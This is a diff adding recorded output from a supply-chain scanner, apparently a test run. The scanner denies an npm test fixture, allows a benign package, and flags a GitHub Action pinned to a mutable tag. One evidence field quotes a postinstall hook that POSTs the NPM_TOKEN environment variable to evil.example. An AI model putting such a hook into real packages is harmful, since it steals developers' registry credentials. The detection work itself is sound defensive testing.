@@ -1,0 +1,85 @@
+$ vetgate check local:tests/fixtures/exfil
+{
+  "verdict": "DENY",
+  "artifact": {
+    "kind": "npm-package",
+    "name": "exfil-demo-pkg",
+    "version": "1.0.0",
+    "sha256": "f715ea41cf6f2e371e595df27e224ad37e3ed37b9ca26a43e4513b922d5d6247"
+  },
+  "findings": [
+    {
+      "rule": "install-script-exfil",
+      "severity": "high",
+      "evidence": "thod: 'POST', body: process.env.NPM_TOKEN })\"",
+      "signal": "local"
+    },
+    {
+      "rule": "install-script-present",
+      "severity": "medium",
+      "evidence": "postinstall: node -e \"fetch('https://evil.example/collect', { method: 'POST', body: process.env.NPM_TOKEN })\"",
+      "signal": "local"
+    }
+  ],
+  "manifest": {
+    "rulesVersion": "2026.10",
+    "checkedAt": "2026-10-26T07:15:23.848Z",
+    "signals": [
+      "local"
+    ]
+  },
+  "safeAction": "Do not install this package. If you must inspect it, download it with scripts disabled and read the flagged code first."
+}
+vetgate: DENY — 2 finding(s)
+exit=1
+
+$ vetgate check local:tests/fixtures/benign
+{
+  "verdict": "ALLOW",
+  "artifact": {
+    "kind": "npm-package",
+    "name": "my-benign-pkg",
+    "version": "1.0.0",
+    "sha256": "5bd28915c32e7bbc5202f0d63484f4a3f5ec1710dda69753cea8ea3a1230f5a4"
+  },
+  "findings": [],
+  "manifest": {
+    "rulesVersion": "2026.10",
+    "checkedAt": "2026-10-26T07:15:23.995Z",
+    "signals": [
+      "local"
+    ]
+  },
+  "safeAction": null
+}
+vetgate: ALLOW — 0 finding(s)
+exit=0
+
+$ vetgate check action:actions/checkout@v4
+{
+  "verdict": "REVIEW",
+  "artifact": {
+    "kind": "github-action",
+    "name": "actions/checkout",
+    "version": "v4",
+    "sha256": null
+  },
+  "findings": [
+    {
+      "rule": "action-mutable-tag",
+      "severity": "medium",
+      "evidence": "action ref \"v4\" is a mutable tag, not a pinned commit SHA",
+      "signal": "local"
+    }
+  ],
+  "manifest": {
+    "rulesVersion": "2026.10",
+    "checkedAt": "2026-10-26T07:15:24.116Z",
+    "signals": [
+      "local"
+    ]
+  },
+  "safeAction": "Pin the action to a full commit SHA (digest) instead of the mutable tag."
+}
+vetgate: REVIEW — 1 finding(s)
+exit=1
